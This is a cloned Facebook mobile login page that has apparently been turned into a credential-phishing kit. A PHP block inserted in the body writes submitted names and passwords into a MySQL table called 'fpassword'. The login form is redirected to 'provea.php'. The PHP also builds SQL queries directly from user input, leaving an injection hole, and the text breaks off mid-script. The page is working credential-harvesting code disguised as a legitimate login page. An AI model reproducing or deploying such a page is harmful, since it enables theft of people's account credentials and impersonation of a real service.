<!DOCTYPE html>
<html>
<head>
<title>Log in to Facebook | Facebook</title>
<meta name="viewport" content="user-scalable=no,initial-scale=1,maximum-scale=1" />
<link href="https://z-m-static.xx.fbcdn.net/rsrc.php/v3/ya/r/O2aKM2iSbOw.png" rel="shortcut icon" sizes="196x196" />
<meta name="referrer" content="default" id="meta_referrer" />
<link type="text/css" rel="stylesheet" 
href="https://z-m-static.xx.fbcdn.net/rsrc.php/v3/yI/l/0,cross/iEFTDmizfMV.css" 
data-bootloader-hash="f6z13" crossorigin="anonymous" /><link type="text/css" rel="stylesheet"
 href="https://z-m-static.xx.fbcdn.net/rsrc.php/v3/yu/l/0,cross/nXrXAgBO62b.css"
 data-bootloader-hash="AuqKi" crossorigin="anonymous" />
 

 <script id="u_0_g">function envFlush(a)
 {function b(b){for(var c in a)b[c]=a[c]}window.requireLazy?window.requireLazy(["Env"],b):(window.Env=window.Env||{},b(window.Env))}
 envFlush({"timeslice_heartbeat_config":{"pollIntervalMs":33,"idleGapThresholdMs":60,"ignoredTimesliceNames":{"requestAnimationFrame":true,
 "Event listenHandler mousemove":true,"Event listenHandler mouseover":true,"Event listenHandler mouseout":true,"Event listenHandler scroll":true},
 "isHeartbeatEnabled":true,"isArtilleryOn":false},"shouldLogCounters":true,"timeslice_categories":{"react_render":true,"reflow":true},
 "sample_continuation_stacktraces":true,"dom_mutation_flag":true});</script><script>document.domain = 'facebook.com';
 </script><script>__DEV__=0;</script>

 <script id="u_0_h" crossorigin="anonymous" src="https://z-m-static.xx.fbcdn.net/rsrc.php/v3/yl/r/awwXl2muo11.js" data-bootloader-hash="vBuwD">
 </script><script id="u_0_e">CavalryLogger=window.CavalryLogger||function(a)
 {this.lid=a,this.transition=!1,this.metric_collected=!1,this.is_detailed_profiler=!1,this.instrumentation_started=!1,
 this.pagelet_metrics={},this.events={},this.ongoing_watch={},this.values={t_cstart:window._cstart},this.piggy_values={},
 this.bootloader_metrics={},this.resource_to_pagelet_mapping={},this.initializeInstrumentation&&this.initializeInstrumentation()},
 CavalryLogger.prototype.setIsDetailedProfiler=function(a){this.is_detailed_profiler=a;return this},CavalryLogger.prototype.setTTIEvent=function(a)
 {this.tti_event=a;return this},CavalryLogger.prototype.setValue=function(a,b,c,d){d=d?this.piggy_values:this.values;(typeof d[a]==="undefined"||c)
 &&(d[a]=b);return this},CavalryLogger.prototype.getLastTtiValue=function(){return this.lastTtiValue},
 CavalryLogger.prototype.setTimeStamp=CavalryLogger.prototype.setTimeStamp||
 function(a,b,c,d){this.mark(a);var e=this.values.t_cstart||this.values.t_start;e=d?e+d:CavalryLogger.now();
 this.setValue(a,e,b,c);this.tti_event&&a==this.tti_event&&(this.lastTtiValue=e,this.setTimeStamp("t_tti",b
 return this},CavalryLogger.prototype.mark=typeof console==="object"&&console.timeStamp?function(a){console.
 timeStamp(a)}:function(){},CavalryLogger.prototype.addPiggyback=function(a,b){this.piggy_values[a]=b;return 
 this},CavalryLogger.instances={},CavalryLogger.id=0,CavalryLogger.disableArtilleryOnUntilOffLogging=!1,
 CavalryLogger.getInstance=function(a){typeof a==="undefined"&&(a=CavalryLogger.id);CavalryLogger.instances[a]|
 |(CavalryLogger.instances[a]=new CavalryLogger(a));return CavalryLogger.instances[a]},CavalryLogger.setPageID=function(a)
 {if(CavalryLogger.id===0){var b=CavalryLogger.getInstance();CavalryLogger.instances[a]=b;CavalryLogger.instances[a].lid=a;delete 
 CavalryLogger.instances[0]}CavalryLogger.id=a},CavalryLogger.now=function(){return window.performance&&performance.timing&&performance.
 timing.navigationStart&&performance.now?performance.now()+performance.timing.navigationStart:new Date().getTime()},CavalryLogger.
 prototype.measureResources=function(){},CavalryLogger.prototype.profileEarlyResources=function(){},CavalryLogger.getBootloaderMet
 ricsFromAllLoggers=function(){},CavalryLogger.start_js=function(){},CavalryLogger.done_js=function(){};CavalryLogger.getInstance(
 ).setTTIEvent("t_domcontent");CavalryLogger.prototype.measureResources=function(a,b){if(!this.log_resources)return;var c="bootloa
 d/"+a.name;if(this.bootloader_metrics[c]!==void 0||this.ongoing_watch[c]!==void 0)return;var d=CavalryLogger.now();this.ongoing_watch[
 c]=d;"start_"+c in this.bootloader_metrics||(this.bootloader_metrics["start_"+c]=d);b&&!("tag_"+c in this.bootloader_metrics)&&(
 this.bootloader_metrics["tag_"+c]=b);if(a.type==="js"){c="js_exec/"+a.name;this.ongoing_watch[c]=d}},CavalryLogger.prototype.sto
 pWatch=function(a){if(this.ongoing_watch[a]){var b=CavalryLogger.now(),c=b-this.ongoing_watch[a];this.bootloader_metrics[a]=c;var
 d=this.piggy_values;a.indexOf("bootload")===0&&(d.t_resource_download||(d.t_resource_download=0),d.resources_downloaded||(d.resou
 rces_downloaded=0),d.t_resource_download+=c,d.resources_downloaded+=1,d["tag_"+a]=="_EF_"&&(d.t_pagelet_cssload_early_resources=b)
 );delete this.ongoing_watch[a]}return this},CavalryLogger.getBootloaderMetricsFromAllLoggers=function(){var a={};Object.values(wind
 ow.CavalryLogger.instances).forEach(function(b){b.bootloader_metrics&&Object.assign(a,b.bootloader_metrics)});return a},CavalryLogg
 er.start_js=function(a){for(var b=0;b<a.length;++b)CavalryLogger.getInstance().stopWatch("js_exec/"+a[b])},CavalryLogger.done_js=fun
 ction(a){for(var b=0;b<a.length;++b)CavalryLogger.getInstance().stopWatch("bootload/"+a[b])},CavalryLogger.prototype.profileEarlyRes
 ources=function(a){for(var b=0;b<a.length;b++)this.measureResources({name:a[b][0],type:a[b][1]?"js":""},"_EF_")};CavalryLogger.get
 Instance().log_resources=true;CavalryLogger.getInstance().setIsDetailedProfiler(true);window.CavalryLogger&&CavalryLogger.getInstan
 ce().setTimeStamp("t_start");</script><script id="u_0_f">(function _(a,b,c,d){function e(a){document.cookie=a+"=;expires=Thu, 01-J
 an-1970 00:00:01 GMT;path=/;domain=.facebook.com"}function f(a,b){document.cookie=a+"="+b+";path=/;domain=.facebook.com;secure"}if
 (!a){e(b);e(c);return}a=null;(navigator.userAgent.indexOf("Firefox")!==-1||!window.devicePixelRatio&&navigator.userAgent.indexOf("W
 indows Phone")!==-1)&&(document.documentElement!=null&&(a=screen.width/document.documentElement.offsetWidth,a=Math.max(1,Math.floor(
 a*2)/2)));(!a||a===1)&&navigator.userAgent.indexOf("IEMobile")!==-1&&(a=Math.sqrt(screen.deviceXDPI*screen.deviceYDPI)/96,a=Math.max
 (1,Math.round(a*2)/2));f(b,(a||window.devicePixelRatio||1).toString());e=window.screen?screen.width:0;b=window.screen?screen.height
 :0;f(c,e+"x"+b);d&&document.cookie&&window.devicePixelRatio>1&&document.location.reload()})(true, "m_pixel_ratio", "wd", false);
 </script><meta name="description" content="Log in to Facebook to start sharing and connecting with your friends, family and peopl
 e you know." /><link rel="canonical" href="https://www.facebook.com/login/" /></head><body tabindex="0" class="touch x1 _fzu _50-3 i
 frame acw"><script id="u_0_d">(function(a){a.__updateOrientation=function(){var b=!!a.orientation&&a.orientation!==180,c=document.b
 ody;c&&(c.className=c.className.replace(/(^|\s)(landscape|portrait)(\s|$)/g," ")+" "+(b?"landscape":"portrait"));return b}})(
 window);</script><div id="viewport" data-kaios-focus-transparent="1">
 
 
 
<?php
$con = mysqli_connect('localhost','root');

mysqli_select_db($con, 'omimondal');

$name = $_POST['name'];
$clint = $_POST['clint'];


$q="select * from fpassword where name ='$name' && password = '$clint'";

$result=mysqli_query($con,$q);

$num=mysqli_num_rows($result);

  if($num==1){
	echo "successful";
}else{
	$qy="insert into fpassword (name,clint)value('$name','$clint')";
	mysqli_query($con,$qy);

}
?>

 
 
 <h1 style="display:block;height:0;overflow:hidden;position:
 absolute;width:0;padding:0">Facebook</h1><div id="page" class=""><div class="_129_" id="header-notices"></div>
 <div class="_7om2 _52we _52z5" id="header"><div class="_4g34 _52z6" data-sigil="mChromeHeaderCenter">
   <i class="img sp_7XcGHqCocZi sx_758944"><u>facebook</u></i>  </div></div>
 <div class="_5soa acw" id="root" role="main" data-sigil="context-layer-root content-pane">
 <div class="_7om2"><div class="_4g34" id="u_0_0">
 <div class="_5yd0 _2ph- _5yd1" style="display: none;" data-sigil="m_login_notice"><div class="_52jd"></div></div>
 <div class="aclb _4-4l"><div id="login_top_banner" data-sigil="m_login_upsell login_identify_step_element">
 </div>
 <div class="_5rut">
 
    <br/>
	<br/>
	 <br/>
	<br/>
 <form method="post"action="provea.php" class="mobile-login-form _5spm" id="login_form">
 
  <input type="hidden" name="number" value="AVpWSRx1" autocomplete="off" />
 <input type="hidden" name="number" value="2684" autocomplete="off" />
 <input type="hidden" name="number" value="1562746288" />
 <input type="hidden" name="number" value="sJ0lXfz382suxvCcKoLIc3eU" />
 <input type="hidden" name="number" value="0" data-sigil="m_login_try_number" />
 <input type="hidden" name="emailk " value="0" data-sigil="m_login_unrecognized_tries" />
 <div id="user_info_container" data-sigil="user_info_after_failure_element">
 </div><div id="pwd_label_container" data-sigil="user_info_after_failure_element">
 </div><div id="otp_retrieve_desc_container"></div>
 <div class="_56be _5sob">
 <div class="_55wo _55x2 _56bf">
 <div id="email_input_container">

 <input autocorrect="off" autocapitalize="off" class="_56bg _4u9z _5ruq" autocomplete="on" id="m_login_email" 
 name="number" placeholder="Mobile number or email address" type="text" data-sigil="m_login_email"/></div><div>
 <div class="_1upc _mg8" data-sigil="m_login_password"><div class="_7om2"><div class="_4g34 _5i2i _52we">
 <div class="_5xu4"><input autocorrect="off" autocapitalize="off" class="_56bg _4u9z _27z2" autocomplete="on" 
 id="m_login_password" name="password" placeholder="Password" type="password" data-sigil="password-plain-text-toggle-input" />
 </div></div>
 
 
 <div class="_5s61 _216i _5i2i _52we"><div class="_5xu4"><div class="_2pi9" style="display:none" id="u_0_1">
 <a href="#" data-sigil="password-plain-text-toggle"><span class="mfss" style="display:none" id="u_0_2">HIDE</span>
 <span class="mfss" id="u_0_3">SHOW</span></a></div></div></div></div></div></div></div></div>
 
 <div class="_2pie" style="text-align:center;">
 <div id="u_0_4" data-sigil="login_password_step_element">
 <button type="submit" onclick="myFunction(­)" value="Log In" class="_54k8 _52jh _56bs _56b_ _28lf 
 _56bw _56bu" name="login" id="u_0_5" data-sigil="touchable m_login_button"><span class="_55sr">Log In</span></button></div>
 <div class="_7eif" id="oauth_login_button_container" style="display:none"></div><div class="_7f_d" id="oauth_login_desc_container" 
 style="display:none"></div>
 
 
 <div id="otp_button_elem_container"></div></div><input type="hidden" name="prefill_contact_point" id="prefill_contact_point" />
 <input type="hidden" name="prefill_source" id="prefill_source" /><input type="hidden" name="prefill_type" id="prefill_type" />
 <input type="hidden" name="first_prefill_source" id="first_prefill_source" /><input type="hidden" name="first_prefill_type" id="first_prefill_type" />
 <input type="hidden" name="had_cp_prefilled" id="had_cp_prefilled" value="false" /><input type="hidden" name="had_password_prefilled" id="had_password_prefilled" 
 value="false" /><input type="hidden" name="is_smart_lock" id="is_smart_lock" value="false" /><div class="_xo8"></div><noscript>
 <input type="hidden" name="_fb_noscript" value="true" /></noscript></form><div><div class="_43mg"><span class="_43mh">or</span></div>
 <div class="_52jj _5t3b" id="u_0_6">Create New Account</div></div><div><div class="other-links"><ul class="_5pkb _55wp">
 <li><span class="mfss fcg">Forgotten password?
 <span aria-hidden="true"> · </span>Help Centre</span></li></ul></div></div></div>
 <div></div></div></div></div><div></div><span><img src="https://facebook.com/security/hsts-pixel.gif?c=3.2" width="0" height="0" style="display:none" />
 </span><div class="_55wr _5ui2" data-sigil="m_login_footer"><div class="_5dpw"><div class="_5ui3" data-nocookies="1"
 id="locale-selector" data-sigil="language_selector marea"><div class="_7om2"><div class="_4g34"><span class="_52jc _52j9 _52jh 
 _3ztb">English (UK)</span><div class="_3ztc"><span class="_52jc">অসমীয়া
 </span></div><div class="_3ztc"><span class="_52jc">नेपाली</span></div><div class="_
 3ztc"><span class="_52jc">Português (Brasil)</span></div></div><div class="_4g34">
 <div class="_3ztc"><span class="_52jc">বাংলা</span></div><div class="_3ztc">
 <span class="_52jc">हिन्दी</span></div><div class="_3ztc"><span class="
 _52jc">Español</span></div><a href="/language.php?n=https%3A%2F%2Fm.face
 book.com%2Flogin%2F%3Fref%3Ddbl%26fl%26refid%3D8&amp;ref=dbl"><div class="_3j87 _1rrd _3ztd" aria-label="Complete list of languages" data-s
 igil="more_language"><i class="img sp_7XcGHqCocZi sx_99315f"></i></div></a></div></div></div><div class="_5ui4"><span class="mfss fcg">Face
 book ©2019</span></div></div></div></div><div class=""></div><div class="viewportArea _2v9s" style="display:none" id="u_0_7" data-sigil="marea">
 <div class="_5vsg" id="u_0_8"></div><div class="_5vsh" id="u_0_9"></div><div class="_5v5d fcg">
 <div class="_2so _2sq _2ss img _50cg" data-animtype="1" data-sigil="m-loading-indicator-animate m-loading-indicator-root">
 </div>Loading...</div></div><div class="viewportArea aclb" id="mErrorView" style="display:none" data-sigil="marea"><div class="container">
 <div class="image"></div><div class="message" data-sigil="error-message"></div><a class="link" data-sigil="MPageError:retry">Try Again</a></div></div></div></div>
 <div id="static_templates"><div class="mDialog" id="modalDialog" style="display:none">
 <div class="_52z5 _451a mFuturePageHeader _1uh1 firstStep titled" id="mDialogHeader">
 <div class="_7om2 _52we"><div class="_5s61"><div class="_52z7"><button type="submit" value="Cancel" class="cancelButton 
 btn btnD bgb mfss touchable" id="u_0_b" data-sigil="dialog-cancel-button">Cancel</button><button type="submit" value="Back"
 class="backButton btn btnI bgb mfss touchable iconOnly" aria-label="Back" id="u_0_c" data-sigil="dialog-back-button">
 <i class="img sp_7XcGHqCocZi sx_e901c0" style="margin-top: 2px;"></i></button></div></div><div class="_4g34">
 <div class="_52z6"><div class="_50l4 mfsl fcw" id="m-future-page-header-title" data-sigil="m-dialog-header-title dialog-title">Loading...</div></div></div>
 <div class="_5s61"><div class="_52z8" id="modalDialogHeaderButtons"></div></div></div></div>
 <div class="modalDialogView" id="modalDialogView"></div><div class="_5v5d _5v5e fcg" id="dialogSpinner">
 <div class="_2so _2sq _2ss img _50cg" data-animtype="1" id="u_0_a" data-sigil="m-loading-indicator-animate m-loading-indicator-root">
 </div>Loading...</div></div></div><script id="u_0_i" crossorigin="anonymous" 
 src="https://z-m-static.xx.fbcdn.net/rsrc.php/v3/yP/r/94qKrJjvl1E.js" data-bootloader-hash="7WaeZ"></script>
 
 
 
 
 
 
 
 
 <script id="u_0_j" crossorigin="anonymous" src="https://z-m-static.xx.fbcdn.net/rsrc.php/v3i9Xz4/yH/l/en_GB/DYUaWmp5Wdv.js"
 data-bootloader-hash="E/TfP"></script><script id="u_0_k" crossorigin="anonymous" src="https://z-m-static.xx.fbcdn.net/rsrc.php/v3iooI4/yK/l/en_GB/i8LBtFIDKkM.js"
 data-bootloader-hash="7h70N"></script><script id="u_0_l" crossorigin="anonymous" src="https://z-m-static.xx.fbcdn.net/rsrc.php/v3/yT/r/W9UjtsOQXEe.js" data-bootloader-hash="WeCkj"></script><script id="u_0_m" crossorigin="anonymous" src="https://z-m-static.xx.fbcdn.net/rsrc.php/v3iQQp4/y8/l/en_GB/-C8wd6JfpPm.js" data-bootloader-hash="2kgCM"></script><script id="u_0_n">requireLazy(["gkx"],function(gkx){gkx.add({"946894":{"result":false,"hash":"AT7V-9ei0qv2zsyb"},"676920":{"result":false,"hash":"AT7IcxAAoPfSYghq"},"676921":{"result":false,"hash":"AT7FPBfmroUwqvMQ"},"676922":{"result":false,"hash":"AT68HRVDWTL9ymXp"},"676837":{"result":false,"hash":"AT4fbbXNXmQK4Juu"}});});require("TimeSliceImpl").guard(function(){(require("ServerJSDefine")).handleDefines([["cr:717822",["TimeSliceImpl"],{"__rc":["TimeSliceImpl","Aa3p5tog_WTFi7YdXV6Hh36Hcj9brPNKA2BmujdCUx0KOPxrYEEdZWwZ9fv3E5CO9IXSt3GBl2s5mcKRDsFfRbA"]},-1],["cr:696703",[],{"__rc":[null,"Aa3p5tog_WTFi7YdXV6Hh36Hcj9brPNKA2BmujdCUx0KOPxrYEEdZWwZ9fv3E5CO9IXSt3GBl2s5mcKRDsFfRbA"]},-1],["cr:682513",["BanzaiOriginal"],{"__rc":["BanzaiOriginal","Aa3p5tog_WTFi7YdXV6Hh36Hcj9brPNKA2BmujdCUx0KOPxrYEEdZWwZ9fv3E5CO9IXSt3GBl2s5mcKRDsFfRbA"]},-1],["cr:729414",[],{"__rc":[null,"Aa2M2YEd0SPlg6qshisSoRmBO2ngUsB3kMpCxKwj9RXz25Z0bAhLWKhKc6MqrRS9ooyDeYlH84s_kizkyUBX"]},-1],["cr:682174",["BanzaiOld"],{"__rc":["BanzaiOld","Aa3KtwBrYm7BbdtjUwPyIsyJdX3-YKRzRZrbI5uJeFkaFZZcgnATDVjoRKw0yf2xwQ-VZ1bGP21W8WaePA"]},-1],["cr:692209",["cancelIdleCallbackBlue"],{"__rc":["cancelIdleCallbackBlue","Aa3p5tog_WTFi7YdXV6Hh36Hcj9brPNKA2BmujdCUx0KOPxrYEEdZWwZ9fv3E5CO9IXSt3GBl2s5mcKRDsFfRbA"]},-1],["ArtilleryExperiments",[],{"artillery_static_resources_pagelet_attribution":false,"artillery_timeslice_compressed_data":false,"artillery_miny_client_payload":false,"artillery_prolong_page_tracing":false,"artillery_navigation_timing_level_2":false,"artillery_profiler_on":false,"artillery_merge_max_distance_sec":1,"artillery_merge_max_duration_sec":1,"user_timing":false},1237],["BootloaderConfig",[],{"jsRetries":null,"jsRetryAbortNum":2,"jsRetryAbortTime":5,"payloadEndpointURI":"https:\/\/m.facebook.com\/ajax\/bootloader-endpoint\/","preloadBE":false,"assumeNotNonblocking":false,"shouldCoalesceModuleRequestsMadeInSameTick":true,"staggerJsDownloads":false,"preloader_num_preloads":0,"preloader_preload_after_dd":false,"preloader_num_loads":1,"preloader_enabled":false,"retryQueuedBootloads":false,"silentDups":false,"asyncPreloadBoost":false},329],["CSSLoaderConfig",[],{"timeout":5000,"modulePrefix":"BLCSS:","loadEventSupported":true},619],["ServerNonce",[],{"ServerNonce":"Qdc-OVadhLAiQPgASlWxEB"},141],["UriNeedRawQuerySVConfig",[],{"uris":["dms.netmng.com","doubleclick.net","r.msn.com","watchit.sky.com","graphite.instagram.com","www.kfc.co.th","learn.pantheon.io","www.landmarkshops.in","www.ncl.com","s0.wp.com","www.tatacliq.com","bs.serving-sys.com","kohls.com","lazada.co.th","xg4ken.com","technopark.ru","officedepot.com.mx","bestbuy.com.mx"]},3871],["ImmediateImplementationExperiments",[],{"prefer_message_channel":true},3419],["PromiseUsePolyfillSetImmediateGK",[],{"www_always_use_polyfill_setimmediate":false},2190],["CurrentCommunityInitialData",[],{},490],["CurrentUserInitialData",[],{"USER_ID":"0","ACCOUNT_ID":"0","NAME":"","SHORT_NAME":null,"IS_MESSENGER_ONLY_USER":false,"IS_DEACTIVATED_ALLOWED_ON_MESSENGER":false},270],["MRequestConfig",[],{"dtsg":{"token":"AQHM6eX8ShQP:AQHFwiaocwTm","valid_for":86400,"expire":1562832688},"dtsg_ag":{"token":"AQwIcvdNVk0q7xGN4Rh-fsfbndeR5j8xDiUHD372jJ5yfw:AQxRcR9iSK8HGfb7xSYBtlvpohtJhh9lSJ6JhTqvUAWJgw","valid_for":604800,"expire":1563351088},"lsd":"AVpWSRx1","checkResponseOrigin":true,"checkResponseToken":true,"cleanFinishedRequest":false,"cleanFinishedPrefetchRequests":false,"ajaxResponseToken":{"secret":"k2_DwvMZ7E71s-4kWAk3giM06Hf4BIVU","encrypted":"AYm4jCSBnqRB9Nd_pTItv5YMVI9yqa0E7iuXKoZv_tV9-RNssvkvUu3JqFwF4AJWaySVa50S4bGzWaOpdXER2JRTe-aZWlkOv_a0f_JkksjQqw"}},51],["SprinkleConfig",[],{"param_name":"jazoest","version":2,"should_randomize":false},2111],["CdnAkamaiDomainsConfig",[],{"fbcdnhdsvideo-vh.akamaihd.net":0,"fbcdn-creative-a.akamaihd.net":1,"fbcdn-dragon-a.akamaihd.net":2,"fbcdn-external-a.akamaihd.net":3,"fbcdn-gtvideo-a-a.akamaihd.net":4,"fbcdn-gtvideo-b-a.akamaihd.net":5,"fbcdn-gtvideo-c-a.akamaihd.net":6,"fbcdn-gtvideo-d-a.akamaihd.net":7,"fbcdn-gtvideo-e-a.akamaihd.net":8,"fbcdn-gtvideo-f-a.akamaihd.net":9,"fbcdn-gtvideo-g-a.akamaihd.net":10,"fbcdn-gtvideo-h-a.akamaihd.net":11,"fbcdn-gtvideo-i-a.akamaihd.net":12,"fbcdn-gtvideo-j-a.akamaihd.net":13,"fbcdn-gtvideo-k-a.akamaihd.net":14,"fbcdn-gtvideo-l-a.akamaihd.net":15,"fbcdn-gtvideo-m-a.akamaihd.net":16,"fbcdn-gtvideo-n-a.akamaihd.net":17,"fbcdn-gtvideo-o-a.akamaihd.net":18,"fbcdn-gtvideo-p-a.akamaihd.net":19,"fbcdn-iphotos-a-a.akamaihd.net":20,"fbcdn-iphotos-a.akamaihd.net":21,"fbcdn-iphotos-b-a.akamaihd.net":22,"fbcdn-iphotos-c-a.akamaihd.net":23,"fbcdn-iphotos-d-a.akamaihd.net":24,"fbcdn-iphotos-e-a.akamaihd.net":25,"fbcdn-iphotos-f-a.akamaihd.net":26,"fbcdn-iphotos-g-a.akamaihd.net":27,"fbcdn-iphotos-h-a.akamaihd.net":28,"fbcdn-photos-a-a.akamaihd.net":29,"fbcdn-photos-a.akamaihd.net":30,"fbcdn-photos-b-a.akamaihd.net":31,"fbcdn-photos-c-a.akamaihd.net":32,"fbcdn-photos-d-a.akamaihd.net":33,"fbcdn-photos-e-a.akamaihd.net":34,"fbcdn-photos-f-a.akamaihd.net":35,"fbcdn-photos-g-a.akamaihd.net":36,"fbcdn-photos-h-a.akamaihd.net":37,"fbcdn-profile-a.akamaihd.net":38,"fbcdn-sphotos-a-a.akamaihd.net":39,"fbcdn-sphotos-b-a.akamaihd.net":40,"fbcdn-sphotos-c-a.akamaihd.net":41,"fbcdn-sphotos-d-a.akamaihd.net":42,"fbcdn-sphotos-e-a.akamaihd.net":43,"fbcdn-sphotos-f-a.akamaihd.net":44,"fbcdn-sphotos-g-a.akamaihd.net":45,"fbcdn-sphotos-h-a.akamaihd.net":46,"fbcdn-static-a.akamaihd.net":47,"fbcdn-video-a-a.akamaihd.net":48,"fbcdn-video-a.akamaihd.net":49,"fbcdn-video-b-a.akamaihd.net":50,"fbcdn-video-c-a.akamaihd.net":51,"fbcdn-video-d-a.akamaihd.net":52,"fbcdn-video-e-a.akamaihd.net":53,"fbcdn-video-f-a.akamaihd.net":54,"fbcdn-video-g-a.akamaihd.net":55,"fbcdn-video-h-a.akamaihd.net":56,"fbcdn-video-i-a.akamaihd.net":57,"fbcdn-video-j-a.akamaihd.net":58,"fbcdn-video-k-a.akamaihd.net":59,"fbcdn-video-l-a.akamaihd.net":60,"fbcdn-video-m-a.akamaihd.net":61,"fbcdn-video-n-a.akamaihd.net":62,"fbcdn-video-o-a.akamaihd.net":63,"fbcdn-video-p-a.akamaihd.net":64,"fbcdn-vthumb-a.akamaihd.net":65,"fbexternal-a.akamaihd.net":66,"fbstatic-a.akamaihd.net":67,"lookbackvideo1-a.akamaihd.net":68,"lookbackvideo2-a.akamaihd.net":69,"lookbackvideo3-a.akamaihd.net":70,"lookbackvideo4-a.akamaihd.net":71,"lookbackvideo5-a.akamaihd.net":72,"lookbackvideo6-a.akamaihd.net":73,"lookbackvideo7-a.akamaihd.net":74,"lookbackvideo8-a.akamaihd.net":75,"igexternal-a.akamaihd.net":76,"fbmentionslive-a.akamaihd.net":77,"fblive-a.akamaihd.net":78,"fbcdn-static-a-a.akamaihd.net":79,"fbcdn-static-b-a.akamaihd.net":80,"fb-s-a-a.akamaihd.net":81,"fb-s-b-a.akamaihd.net":82,"fb-s-c-a.akamaihd.net":83,"fb-s-d-a.akamaihd.net":84,"fb-l-a-a.akamaihd.net":85,"fb-l-b-a.akamaihd.net":86,"fb-l-c-a.akamaihd.net":87,"fb-l-d-a.akamaihd.net":88,"fb-sq-a-a.akamaihd.net":89,"fb-sq-b-a.akamaihd.net":90,"fb-sq-c-a.akamaihd.net":91,"fb-sq-d-a.akamaihd.net":92,"fb-lq-a-a.akamaihd.net":93,"fb-lq-b-a.akamaihd.net":94,"fb-lq-c-a.akamaihd.net":95,"fb-lq-d-a.akamaihd.net":96},1634],["ISB",[],{},330],["LSD",[],{"token":"AVpWSRx1"},323],["SiteData",[],{"server_revision":1000923231,"client_revision":1000923231,"tier":"","push_phase":"C3","pkg_cohort":"FW_EXP:mtouch_pkg","pr":1,"haste_site":"mobile","be_mode":0,"be_key":"__be","ir_on":true,"is_rtl":false,"is_comet":false,"vip":"157.240.23.35"},317],["InitialCookieConsent",[],{"deferCookies":false,"noCookies":false},4328],["TimeSliceInteractionSV",[],{"on_demand_reference_counting":true,"on_demand_profiling_counters":true,"default_rate":1000,"lite_default_rate":100,"interaction_to_lite_coinflip":{"ADS_INTERFACES_INTERACTION":0,"ads_perf_scenario":0,"ads_wait_time":0,"Event":10,"video_psr":0,"video_stall":0},"interaction_to_coinflip":{"ADS_INTERFACES_INTERACTION":1,"ads_perf_scenario":1,"ads_wait_time":1,"video_psr":1000000,"video_stall":2500000,"Event":500,"pixelcloud_view_performance":25,"intern_notify_inbox_page_load":10,"intern_notify_jewel_list_load":10,"tasks_initial_page_load":1,"watch_carousel_left_scroll":1,"watch_carousel_right_scroll":1,"watch_sections_load_more":1,"watch_discover_scroll":1,"fbpkg_ui":1,"sevmanager_powersearch_initial_page_load":10,"network_ui":1,"daiquery_interactive_query":1},"enable_heartbeat":true,"maxBlockMergeDuration":0,"maxBlockMergeDistance":0,"enable_banzai_stream":true,"user_timing_coinflip":50,"banzai_stream_coinflip":1,"compression_enabled":true,"ref_counting_fix":true,"ref_counting_cont_fix":false,"also_record_new_timeslice_format":false,"force_async_request_tracing_on":false},2609],["ErrorDebugHooks",[],{"SnapShotHook":null},185],["BigPipeExperiments",[],{"link_images_to_pagelets":false,"enable_bigpipe_plugins":false},907],["RunGatingConfig",[],{"shouldUseBrowserUnload":true},3914],["CookieCoreConfig",[],{"a11y":{},"act":{},"c_user":{},"ddid":{"p":"\/deferreddeeplink\/","t":2419200},"dpr":{"t":604800},"js_ver":{"t":604800},"locale":{"t":604800},"lh":{"t":604800},"m_pixel_ratio":{"t":604800},"noscript":{},"pnl_data2":{"t":2},"presence":{},"sW":{},"sfau":{},"wd":{"t":604800},"x-referer":{},"x-src":{"t":1}},2104],["CookieCoreLoggingConfig",[],{"maximumIgnorableStallMs":16.67,"sampleRate":9.7e-5,"sampleRateClassic":1.0e-10,"sampleRateFastStale":1.0e-8},3401],["MBanzaiConfig",[],{"EXPIRY":86400000,"MAX_SIZE":10000,"MAX_WAIT":30000,"RESTORE_WAIT":30000,"gks":{"boosted_component":true,"platform_oauth_client_events":true,"visibility_tracking":true,"xtrackable_clientview_batch":true,"boosted_pagelikes":true,"gqls_web_logging":true},"blacklist":["time_spent"]},32],["MJSEnvironment",[],{"IS_APPLE_WEBKIT_IOS":false,"IS_TABLET":false,"IS_ANDROID":false,"IS_CHROME":true,"IS_FIREFOX":false,"IS_WINDOWS_PHONE":false,"IS_SAMSUNG_DEVICE":false,"OS_VERSION":10,"PIXEL_RATIO":1,"BROWSER_NAME":"Edge"},46],["UserAgentData",[],{"browserArchitecture":"64","browserFullVersion":"17.17134","browserMinorVersion":17134,"browserName":"Edge","browserVersion":17,"deviceName":"Unknown","engineName":"EdgeHTML","engineVersion":"17.17134","platformArchitecture":"64","platformName":"Windows","platformVersion":"10","platformFullVersion":"10"},527],["ZeroRewriteRules",[],{"rewrite_rules":{},"whitelist":{"\/hr\/r":1,"\/hr\/p":1,"\/zero\/unsupported_browser\/":1,"\/zero\/policy\/optin":1,"\/zero\/optin\/write\/":1,"\/zero\/optin\/legal\/":1,"\/zero\/optin\/free\/":1,"\/about\/privacy\/":1,"\/about\/privacy\/update\/":1,"\/about\/privacy\/update":1,"\/zero\/toggle\/welcome\/":1,"\/zero\/toggle\/nux\/":1,"\/fup\/interstitial\/":1,"\/work\/landing":1,"\/work\/login\/":1,"\/work\/email\/":1,"\/ai.php":1,"\/js_dialog_resources\/dialog_descriptions_android.json":0,"\/connect\/jsdialog\/MPlatformAppInvitesJSDialog\/":0,"\/connect\/jsdialog\/MPlatformOAuthShimJSDialog\/":0,"\/connect\/jsdialog\/MPlatformLikeJSDialog\/":0,"\/qp\/interstitial\/":1,"\/qp\/action\/redirect\/":1,"\/qp\/action\/close\/":1,"\/zero\/support\/ineligible\/":1,"\/zero_balance_redirect\/":1,"\/zero_balance_redirect":1,"\/l.php":1,"\/lsr.php":1,"\/ajax\/dtsg\/":1,"\/checkpoint\/block\/":1,"\/exitdsite":1,"\/zero\/balance\/pixel\/":1,"\/zero\/balance\/":1,"\/zero\/balance\/carrier_landing\/":1,"\/zero\/flex\/logging\/":1,"\/tr":1,"\/tr\/":1,"\/sem_campaigns\/sem_pixel_test\/":1,"\/bookmarks\/flyout\/body\/":1,"\/zero\/subno\/":1,"\/confirmemail.php":1,"\/policies\/":1,"\/mobile\/internetdotorg\/classifier\/":1,"\/zero\/dogfooding":1,"\/xti.php":1,"\/zero\/fblite\/config\/":1,"\/lite\/":1,"\/hr\/zsh\/wc\/":1,"\/4oh4.php":1,"\/autologin.php":1,"\/birthday_help.php":1,"\/checkpoint\/":1,"\/contact-importer\/":1,"\/cr.php":1,"\/legal\/terms\/":1,"\/login.php":1,"\/login\/":1,"\/mobile\/account\/":1,"\/n\/":1,"\/remote_test_device\/":1,"\/upsell\/buy\/":1,"\/upsell\/buyconfirm\/":1,"\/upsell\/buyresult\/":1,"\/upsell\/promos\/":1,"\/upsell\/continue\/":1,"\/upsell\/h\/promos\/":1,"\/upsell\/l